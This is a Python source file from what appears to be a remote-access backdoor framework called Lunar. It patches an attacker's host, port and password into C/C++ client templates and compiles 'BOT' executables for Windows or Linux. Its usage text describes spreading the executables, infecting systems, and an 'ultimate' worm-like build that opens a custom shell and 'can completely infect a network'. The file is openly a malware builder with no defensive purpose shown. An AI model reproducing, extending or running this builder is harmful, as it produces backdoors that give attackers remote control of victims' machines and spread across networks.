"""

Generate Agent

"""
import os
import subprocess
from .banner import *
import colorama
from colorama import Fore
colorama.init()
p_banner()


def create_agent(l_host, l_port, passwd, mode):
    if len(l_host) > 0 and len(l_port) > 0 and len(mode) > 0:
        if mode == "static":
            static = True
        else:
            static = False
        os.chdir("bot")
        with open("clientc.h", "r+") as source_code:
            source = source_code.read()
            replace = source.replace("lhost", l_host)
            fre_place = replace.replace("lport", l_port)
            final_replace = fre_place.replace("passwd", passwd)
            with open("client.h", "w") as final:
                final.write(final_replace)

        if os.name == "nt":
            if static is True:
                print(
                    Fore.GREEN + "[+] " + Fore.WHITE + "Building Static BOT which will connect on {lhost}:{lport}.".format(
                        lhost=l_host, lport=l_port))
                subprocess.call(["make", "windows-static"], stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
            else:
                print(Fore.GREEN + "[+] " + Fore.WHITE + "Building BOT which will connect on {lhost}:{lport}.".format(
                    lhost=l_host, lport=l_port))
                subprocess.call(["make", "windows"], stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        else:
            if static is True:
                print(
                    Fore.GREEN + "[+] " + Fore.WHITE + "Building Static BOT which will connect on {lhost}:{lport}.".format(
                        lhost=l_host, lport=l_port))
                subprocess.call(["make", "linux-static"], stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
            else:
                print(Fore.GREEN + "[+] " + Fore.WHITE + "Building BOT which will connect on {lhost}:{lport}.".format(
                    lhost=l_host, lport=l_port))
                subprocess.call(["make", "linux"], stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)

        os.chdir("..")
        try:
            file = "bot/Lunar.exe"
            with open(file, "rb") as backdoor:
                hello = os.stat(file)
                print(Fore.BLUE + "\n-> Lunar.exe" + Fore.WHITE + "| Size : {size} bytes | Path : {path}".format(
                    size=str(hello.st_size), path=os.path.dirname(os.path.abspath(file))))
        except FileNotFoundError:
            print(Fore.RED + "[!] " + Fore.WHITE + "-> Failed to create Backdoor.")
        except Exception as es:
            print(Fore.RED + "[!] " + Fore.WHITE + "-> Error : " + str(es))

    else:
        print("""
		[X] USAGE : build lhost=<lhost> lport=<lport> <passwd> <static>/<normal>

		lhost - Ipv4 Address of Server to Connect to.
		lport - Port of Server to Connect to.
		static - Standalone Executable to run on almost any System.
		normal - Executable that requires libraries to run.
		ultimate - Payloads generated in C Code instead of C++. These payloads carry reflective dll capabilities. Generates a standalone executable. Note: This attack generates a custom shell. This attack is for specific targets, as it acts as a worm.
		<passwd> - Password you have set in clientc.h and settings.ini

		EXAMPLES: 
		STATIC
		[+] build lhost=192.168.0.101 lport=443 static
		|- Size : Around 2.1 MB. Can be more depending on the payload.
		|- This will generate an Executable that you can easily spread 
			without worrying if it will work or not.

        NORMAL
		[+] build lhost=192.168.0.101 lport=443 normal
		|- Size : Around 600 kb.
		|- This will generate an Executable that you can use for tests
			on your own PC. You must infect a System in an environment where
			it can run. This can be used as a more specific payload.
		""")


def Build(l_host, l_port):
    print(Fore.GREEN + "[+] " + Fore.WHITE + "Building Custom Payload to connect on {lhost}:{lport}.".format(lhost=l_host, lport=l_port))
    from .msf import inplace_change
    os.chdir("botc")
    print(Fore.BLUE + "[*] Processing!")
    inplace_change("connect.c", "{{serverhost}}", l_host)
    inplace_change("connect.c", "{{serverport}}", l_port)
    subprocess.call(["make"], stderr=subprocess.STDOUT, stdout=None)
    try:
        file = "Lunarc.exe"
        with open(file, "rb") as backdoor:
            hello = os.stat(file)
            print(Fore.GREEN + "Build Successful.")
            print(Fore.YELLOW + "\n-> Lunarc.exe" + Fore.WHITE + "| Size : {size} bytes | Path : {path}".format(
                size=str(hello.st_size), path=os.path.dirname(os.path.abspath(file))))
    except FileNotFoundError:
        print(Fore.RED + "[!] " + Fore.WHITE + "-> Failed to create Backdoor.")
    except Exception as es:
        print(Fore.RED + "[!] " + Fore.WHITE + "-> Error : " + str(es))
    inplace_change("connect.c", l_host, "{{serverhost}}")
    inplace_change("connect.c", l_port, "{{serverport}}")
    os.chdir("..")

    if len(l_host) == 0 and len(l_port) == 0:
        print("""
		[X] USAGE : build lhost=<lhost> lport=<lport> <passwd> <static>/<normal>
		lhost - Ipv4 Address of Server to Connect to.
		lport - Port of Server to Connect to.
		ultimate - Payloads generated in C Code instead of C++. These payloads carry reflective dll capabilities. Generates a standalone executable. Note: This attack generates a custom shell. This attack is for specific targets, as it acts as a worm.
		<passwd> - Password you have set in clients and ini.

		EXAMPLES: 
		ULTIMATE
		[+] build lhost=192.168.0.101 lport=443 ultimate
		|- Size : Unknown at this time. May vary.
		|- This will generate an Executable that you can easily spread
		    without worrying if it will work or not. In addition
		    this build can generate a custom shell, and can completely infect a network.
		    This option is also designed for specifying and adding modules or external payloads.
		    However, this option does lack some exploits that the other builds contain.
		    In a real environment, one could use this executable to call another static executable, and thus creating a shell.
		""")
